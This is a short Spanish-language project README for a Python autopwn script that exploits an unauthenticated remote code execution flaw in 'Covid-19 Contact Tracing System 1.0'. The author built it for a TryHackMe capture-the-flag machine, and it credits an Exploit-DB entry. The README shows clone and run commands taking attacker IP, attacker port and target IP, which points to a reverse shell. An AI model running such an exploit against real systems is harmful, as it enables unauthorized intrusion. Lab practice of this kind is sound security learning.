# Covid19 Contact Tracing System 1.0 (Unauthenticated RCE)
Este es un exploit que use y mejoré para la máquina Lockdown de TryHackMe, te automatiza practicamente toda la intrusión mediante la subida de un fichero a la máquina. Para esto, obviamente la aplicación debe trabajar con el Contact Tracer, "Covid-19 Contact Tracing System 1.0".

## Motivos de la creación
* Practicar Python3 
* Hacer un script autopwn

## Instalación y uso
```bash 
$ git clone https://github.com/sha-16/Covid19-Contact-Tracing-System-1.0-RCE.git
$ cd Covid19-Contact-Tracing-System-1.0/
$ chmod +x covid19_contacttracer.py
$ python3 covid19_contacttracer.py <attacker-ip> <attacker-port> <target-ip>
```
## Créditos
**Exploit v1**: https://www.exploit-db.com/exploits/49604

**Nota:** si tienes propuestas para mejorar este script o cambiar cosas, hazmelas saber por favor... me ayudarías mucho ❤.
